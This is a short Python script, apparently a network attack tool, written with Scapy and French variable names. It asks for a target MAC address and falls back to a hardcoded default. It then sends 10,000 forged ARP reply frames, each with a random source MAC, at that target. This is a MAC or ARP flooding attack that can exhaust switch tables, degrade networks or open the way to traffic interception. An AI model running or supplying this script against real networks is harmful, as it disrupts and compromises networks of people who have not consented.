#!/usr/local/bin/ipython3
from scapy.all import *
import random

#####
#VARS
#####

mac_cible = input("mac cible : ")
if not mac_cible:
    mac_cible = '00:14:6A:A8:63:80'

####
#DEF
####

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
        )



i = 0
while i<10000:
    macloop = rand_mac()
    print(macloop)
    sendp(Ether(src=macloop ,dst=mac_cible)/ARP(op=2, psrc="0.0.0.0", hwdst=mac_cible)/Padding(load="X"*18),verbose=0)
    #sendp(Ether(src=macloop, dst=mac_cible)/ARP(op=2, psrc="0.0.0.0", hwdst= mac_cible))
    i+=1
